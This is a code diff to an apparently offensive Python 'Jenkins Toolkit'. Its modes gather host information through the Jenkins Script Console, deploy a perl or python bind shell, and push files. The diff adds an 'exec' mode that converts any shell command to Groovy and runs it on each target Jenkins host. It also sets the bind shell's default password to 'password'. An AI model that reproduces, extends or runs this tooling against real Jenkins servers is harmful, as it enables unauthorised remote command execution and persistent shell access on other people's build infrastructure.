@@ -210,12 +210,12 @@ def WriteJenkinsInfo(url,text,file):
 parser = argparse.ArgumentParser(description='Jenkins Toolkit')
 
 parser.add_argument('-u','--url', nargs='+', help='<Required> One or more Jenkins Urls to process. You can also specifiy a text file with the urls in it', required=True, type=str)
-parser.add_argument("-m", "--mode", type=str, choices=['info','shell','pushfile'], help='<Required> Specifies the Toolkit Mode\n Info: Gather Infos of Jenkins Host via Script Console\nShell: Deloys a bind Shell on the Jenkins Host\nPushFile:Pushes a file to the Jenkins Host\n')
+parser.add_argument("-m", "--mode", type=str, choices=['info','exec','shell','pushfile'], help='<Required> Specifies the Toolkit Mode\n Info: Gather Infos of Jenkins Host via Script Console\nExec: Executes the given shell command\nShell: Deloys a bind Shell on the Jenkins Host\nPushFile:Pushes a file to the Jenkins Host\n')
 parser.add_argument("-v", "--verbose", help="Show Debug Information",action="store_true")
 
 _pgroup_mode_shell = parser.add_argument_group("Toolkit Mode: Shell")
 
-_pgroup_mode_shell.add_argument('-spw','--shellpassword', help='<Optional> Password for Shell', type=str, default=None)
+_pgroup_mode_shell.add_argument('-spw','--shellpassword', help='<Optional> Password for Shell', type=str, default='password')
 _pgroup_mode_shell.add_argument('-sp','--shellport', help='<Required> Port Bind Shell', type=int, default=0)
 _pgroup_mode_shell.add_argument("-st", "--shelltype", type=str, choices=['perl','python'], help='<Optional> Specifies Shell Script Type - Default:"perl"', default="perl")
 
@@ -225,6 +225,9 @@ _pgroup_mode_info.add_argument('-o','--output', help='<Optional> File where the 
 
 _pgroup_mode_pushfile = parser.add_argument_group("Toolkit Mode: Pushfile")
 _pgroup_mode_pushfile.add_argument('-f','--file', help='<Required> File to push to Jenkins Host', type=str, default=None)
+
+_pgroup_mode_exec_command = parser.add_argument_group("Toolkit Mode: Exec Command")
+_pgroup_mode_exec_command.add_argument('-c','--command', help='<Required> Command to execute', type=str, default=None)
 
 
 args = parser.parse_args()
@@ -406,6 +409,15 @@ for jenkinsurl in url_list:
 
           if not args.output==None:
               WriteJenkinsInfo(jenkinsurl,"{0} failed!".format(jenkinsurl),args.output)
+    
+    if args.mode == "exec":
+
+        if system_type == "windows":      
+            result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript(args.command,True))
+        else:
+            result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript(args.command,True))
+
+        print(result)    
 
     if args.mode == "pushfile":
 
